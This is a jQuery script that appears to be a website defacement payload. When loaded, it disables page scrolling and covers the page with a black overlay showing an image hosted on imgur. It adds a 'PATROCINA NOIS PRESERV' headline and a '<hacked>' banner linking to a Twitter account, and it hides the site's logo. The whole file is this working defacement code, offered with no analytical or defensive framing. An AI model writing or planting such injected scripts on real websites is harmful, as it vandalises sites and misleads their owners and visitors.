jQuery(document).ready(function($) {
	//DESTIVAR O SCROLL DO MOUSE
	$('html, body').css({
	    overflow: 'hidden',
	    height: '100%'
	});
	//DIV
	var elem = $('<div id="df54g65df4g65df4g65df4"></div>');
    elem.css('background-color', '#000');
    elem.css('height', '100%');
    elem.css('width', '100%');
    elem.css('background-image', 'url("http://i.imgur.com/CqCjBdN.jpg")');
    elem.css('background-repeat', 'no-repeat');
    elem.css('background-size', '600px 337px');
    elem.css('background-position', 'center');

    var elem2 = $('<h1>PATROCINA NOIS PRESERV</h1>');
    elem2.css('color', '#fff');
    elem2.css('font-size', '3.5em');
    elem2.css('text-align', 'center');

    var elem3 = $('<p><strong>&lt;hacked&gt; <a href="https://twitter.com/s4vi2"> https://twitter.com/s4vi2 </a> &lt;/hacked&gt;</strong></p>');
    elem3.css('color', '#fff');
    elem3.css('font-size', '1em');
    elem3.css('text-align', 'center');
    elem3.css('margin-top', '10px');

    $("body").prepend(elem);
    $("#df54g65df4g65df4g65df4").prepend(elem2);
    $("#df54g65df4g65df4g65df4").prepend(elem3);
    $("#logoRoll").hide();
});
